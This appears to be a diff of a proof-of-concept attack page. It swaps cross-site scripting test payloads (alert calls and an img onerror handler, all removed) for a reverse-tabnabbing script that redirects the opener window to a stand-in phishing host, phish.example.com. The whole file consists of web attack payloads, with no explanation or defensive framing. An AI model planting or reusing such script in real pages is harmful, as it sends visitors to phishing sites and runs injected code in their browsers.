@@ -1,10 +1,9 @@
 <html>
  <body>
   <script>
-   alert(document.domain);
-   alert('xss');
+   if (window.opener) {
+      window.opener.location = "https://phish.example.com";
+   }
   </script>
-  <div class="copyrightfooter">
-   <img src=x onerror=alert(document.domain)></img>
  </body>
 </html>
